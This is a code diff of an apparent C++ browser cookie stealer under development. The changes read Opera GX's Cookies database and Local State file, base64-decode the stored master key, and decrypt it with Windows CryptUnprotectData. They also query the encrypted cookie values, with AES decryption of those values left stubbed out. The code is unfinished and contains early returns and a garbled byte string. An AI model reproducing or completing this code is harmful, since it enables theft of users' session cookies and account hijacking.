@@ -8,9 +8,12 @@
 #include <vector>
 #include <windows.h>
 #include "single_include/nlohmann/json.hpp"
-
+#include "base64.h"
+#include <windows.h>
+#include "aes256.hpp"
 //#include "cookie_decryptor.h"
 #include "sqlite3.h"
+#include "tools.h"
 
 //pragma comment(lib, "sqlite3.lib")
 #pragma comment(lib, "Ws2_32.lib")
@@ -170,11 +173,39 @@ static int callback(void* NotUsed, int argc, char** argv, char** azColName) {
     
 }
 
+vector<BYTE> slice_vec(vector<BYTE> vec, int from) {
+    vector<BYTE> res_vec;
+    for (int counter = 0; vec.size() != counter; ++counter) {
+        if (counter >= from) res_vec.push_back(vec[counter]);
+       // std::cout << *cur;
+    }
+    return res_vec;
+}
+
+std::string hexStr(const uint8_t* data, int len)
+{
+    std::stringstream ss;
+    ss << std::hex;
+    for (int i(0); i < len; ++i)
+        ss << std::setw(2) << std::setfill('0') << (int)data[i];
+    return ss.str();
+}
 
 int main(int argc, char** argv)
 {
+    setlocale(LC_ALL, "");
+    SetConsoleOutputCP(CP_UTF8/*1251*/);
     string cookie_path = "C:\\Users\\empty\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies";
     string encrypted_master_key_path = "C:\\Users\\empty\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State";
+
+    std::stringstream pass;
+
+    sqlite3* db1 = 0;
+    int resp = sqlite3_open(cookie_path.c_str(), &db1);
+    pass = get_chrome_cookies(db1);
+    //cout << pass.str();
+
+    return 0;
 
     std::vector<char> data(13000);
     ifstream readen_mk(encrypted_master_key_path, ios_base::in);
@@ -183,18 +214,50 @@ int main(int argc, char** argv)
 
     string reformat;
 
-    for (char str : data) reformat.push_back(str);
-    cout << reformat.length();
 
+    for (char str : data) reformat.push_back(str);
+    json data_encrypted = json::parse(reformat);
+    string encrypted_key = data_encrypted["os_crypt"]["encrypted_key"];
+    std::vector<BYTE> decodedData = base64_decode(encrypted_key);
+    vector<BYTE> preapared_vec = slice_vec(decodedData, 5);
+
+   // for (int i = 0; i != sizeof byte_mas; ++i) cout << byte_mas[i];
+    //cout << byte_mas[0] << endl;
+   // cout << endl;
+    DATA_BLOB encr;
+   // cout << &encr.pbData;
+
+    DATA_BLOB decr;
+    //BYTE s[decodedData.size()] = "1";
+    encr.pbData = preapared_vec.data();
+
+    CryptUnprotectData(
+        &encr,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        0,
+        &decr);
+
+    ByteArray dec;
+    cout << &decr.pbData << "  " << &decr.cbData;
     return 1;
+
+    string s = "v10Р}g‘ЮC;1Q=итыVeir\0ЖcрЗ«pК\sВ}чЂоҐwJЌ—=i—6ЋЃЎЯѕuҐZе’іҐ‘ѕ :^‰#©ЮегZJ";
+
+   // Aes256::decrypt(&decr.pbData, s, dec);
+
+    //return 1;
 
     sqlite3* db = 0; // хэндл объекта соединение к БД
     char* zErrMsg = 0;
     int res;
     res = sqlite3_open(cookie_path.c_str(), &db);
-    string execute_command = "SELECT name, value from cookies;";
+    string execute_command = "SELECT name, encrypted_value from cookies;";
     sqlite3_exec(db, execute_command.c_str(), callback, 0, &zErrMsg);
 //    cout << zErrMsg;
+    return 1;
 }
 
 int f(){
